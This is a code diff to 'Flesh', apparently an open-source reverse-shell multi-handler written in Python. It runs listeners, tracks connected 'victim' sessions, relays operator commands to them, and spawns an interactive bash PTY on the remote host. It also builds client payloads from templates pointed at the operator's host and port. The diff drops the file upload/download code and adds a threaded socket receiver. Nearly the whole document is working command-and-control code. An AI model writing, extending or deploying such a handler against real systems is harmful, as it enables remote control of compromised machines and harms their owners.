@@ -5,7 +5,6 @@ import sys
 import os
 from datetime import datetime
 
-# --- Configuration & Globals ---
 all_conn = []
 all_add = []
 active_listeners = {} 
@@ -19,13 +18,13 @@ def print_banner():
 ░▓█▒  ░▒██░    ▒▓█  ▄   ▒   ██▒░▓█ ░██ 
 ░▒█░   ░██████▒░▒████▒▒██████▒▒░▓█▒░██▓
  ▒ ░   ░ ▒░▓  ░░░ ▒░ ░▒ ▒▓▒ ▒ ░ ▒ ░░▒░▒
- ░     ░ ░ ▒  ░ ░ ░  ░░ ░▒  ░ ░ ▒ ░▒░ ░
- ░ ░     ░ ░      ░   ░  ░  ░   ░  ░░ ░
+ ░       ░ ░ ▒  ░ ░ ░  ░░ ░▒  ░ ░ ▒ ░▒░ ░
+ ░ ░       ░ ░      ░   ░  ░  ░   ░  ░░ ░
            ░  ░   ░  ░      ░   ░  ░  ░
     """
     print(banner)
     print("      -- Flesh Multi-Handler Console --")
-    print("   Github: https://github.com/vibebhavv/Flesh\n")
+    print("    Github: https://github.com/vibebhavv/Flesh\n")
 
 def write_log(session_id, ip, data, direction="IN"):
     if not LOG_DIR: return
@@ -36,62 +35,74 @@ def write_log(session_id, ip, data, direction="IN"):
 
 def send_victim_cmd(conn, ip, shell_type, session_id):
     print(f"[*] Mode: {shell_type.upper()} | ID: {session_id}")
-    print("[*] Transfer: use 'upload <file>' or 'download <file>'")
+    print("[*] Type 'quit_sh' to return to console.")
     
     if shell_type == "pty":
         conn.send(str.encode("python3 -c 'import pty; pty.spawn(\"/bin/bash\")'\n"))
 
-    while True:
-        try:
-            cmd = input(f"{ip}> ").strip()
-            if cmd == 'quit_sh': break
-            if not cmd: continue
+    stop_session = threading.Event()
+    shell_ready = threading.Event()
+    shell_ready.set() 
 
-            # --- UPLOAD LOGIC ---
-            if cmd.startswith("upload "):
-                filename = cmd.split(" ")[1]
-                if os.path.exists(filename):
-                    print(f"[*] Uploading {filename}...")
-                    with open(filename, "rb") as f:
-                        file_data = f.read()
-                    header = f"_upload_:{os.path.basename(filename)}:{len(file_data)}:".encode()
-                    conn.send(header + file_data)
-                    print(f"[+] Upload complete.")
-                else:
-                    print("[ERR] Local file not found.")
-                continue
-
-            # --- DOWNLOAD LOGIC ---
-            elif cmd.startswith("download "):
-                filename = cmd.split(" ")[1]
-                print(f"[*] Requesting download: {filename}...")
-                conn.send(f"_download_:{filename}".encode())
+    def receiver_thread(connection):
+        """Background thread to constantly read from the socket."""
+        connection.settimeout(1.0)
+        while not stop_session.is_set():
+            try:
+                data = connection.recv(40960)
+                if not data:
+                    print("\n[!] Connection closed by remote host.")
+                    stop_session.set()
+                    break
                 
-                header = conn.recv(1024).decode()
-                if header.startswith("_file_out_"):
-                    filesize = int(header.split(":")[1])
-                    content = b""
-                    while len(content) < filesize:
-                        content += conn.recv(4096)
-                    
-                    save_name = f"dl_{session_id}_{os.path.basename(filename)}"
-                    with open(save_name, "wb") as f:
-                        f.write(content)
-                    print(f"[+] File saved as: {save_name}")
-                else:
-                    print(f"[ERR] Remote file error: {header}")
+                resp = data.decode('utf-8', errors='ignore')
+                write_log(session_id, ip, resp, "IN")
+                
+                sys.stdout.write(resp)
+                sys.stdout.flush()
+                
+                shell_ready.set()
+            except socket.timeout:
                 continue
+            except Exception as e:
+                if not stop_session.is_set():
+                    print(f"\n[!] Receiver Error: {e}")
+                break
 
-            # --- STANDARD COMMAND LOGIC ---
+    # Start the background receiver
+    t = threading.Thread(target=receiver_thread, args=(conn,), daemon=True)
+    t.start()
+
+    # Main thread handles User Input
+    while not stop_session.is_set():
+        try:
+            shell_ready.wait(timeout=1.5)
+            shell_ready.clear()
+
+            cmd = input("").strip()
+            
+            if not cmd:
+                conn.send(b"\n")
+                shell_ready.set()
+                continue
+            
+            if cmd == 'quit_sh':
+                stop_session.set()
+                break
+
+            # --- SEND COMMAND ---
             write_log(session_id, ip, cmd, "OUT")
             conn.send(str.encode(cmd + "\n"))
-            client_resp = str(conn.recv(40960), 'utf-8')
-            write_log(session_id, ip, client_resp, "IN")
-            print(client_resp, end="")
 
-        except Exception as e:
-            print(f"\n[!] Error during transfer/command: {e}")
+        except (KeyboardInterrupt, EOFError):
+            stop_session.set()
             break
+        except Exception as e:
+            print(f"\n[!] Sender Error: {e}")
+            stop_session.set()
+            break
+            
+    print(f"\n[*] Exiting session {session_id}...")
 
 def start_flesh(host):
     current_context = None 
@@ -118,7 +129,7 @@ def start_flesh(host):
     COMMAND             DESCRIPTION
     -------             -----------
     ls                  List active sessions
-    sl <id>             Select session (inside: use upload/download)
+    sl <id>             Select session for interaction
     kill <id>           Terminate a specific client
     set shell <type>    Switch between 'tty' and 'pty'
     use <port>          Focus on a specific listener
@@ -161,7 +172,7 @@ def start_flesh(host):
             elif cmd == "clear": os.system('clear' if os.name == 'posix' else 'cls')
             elif cmd == "exit": os._exit(0)
             elif cmd:
-                print("[!] Inavlid command, type (help) for available commands.")
+                print("[!] Invalid command, type (help) for available commands.")
         except KeyboardInterrupt: os._exit(0)
 
 def kill_listener(port):
@@ -206,7 +217,6 @@ def list_conn(filter_port=None):
     for i in range(len(all_conn)):
         try:
             if filter_port and all_add[i][2] != filter_port: continue
-            # Check if connection is still alive
             all_conn[i].send(str.encode(' ')) 
             print(f"{i:<5} {all_add[i][0]:<18} {all_add[i][1]:<12} {all_add[i][2]:<15}")
         except:
@@ -217,7 +227,6 @@ def list_conn(filter_port=None):
     print("")
 
 def generate_client(gen_type, host, port):
-    # Fallback if host is empty (binds to 0.0.0.0 usually means you need your actual IP)
     target_host = host if host and host != '0.0.0.0' else "127.0.0.1"
     
     template_path = f"assets/template_{gen_type}.txt"
@@ -232,7 +241,6 @@ def generate_client(gen_type, host, port):
         with open(template_path, "r") as f:
             template = f.read()
 
-        # Replace placeholders
         payload = template.replace("{host}", target_host).replace("{port}", str(port))
 
         with open(output_file, "w") as f:
@@ -279,19 +287,15 @@ def main():
     parser.add_argument("--log", type=str, help="Folder for session logs")
     args = parser.parse_args()
     
-    # 1. Handle Logging
     if args.log:
         LOG_DIR = args.log
         if not os.path.exists(LOG_DIR): os.makedirs(LOG_DIR)
         
-    # 2. Parse Ports
     port_list = [int(p.strip()) for p in args.ports.split(",")]
     
     if args.generate:
-        # Generate for the first port provided in the list
         generate_client(args.generate, args.host, port_list[0])
 
-    # Start all listeners in background threads
     for p in port_list: 
         socket_setup(args.host, p)
     
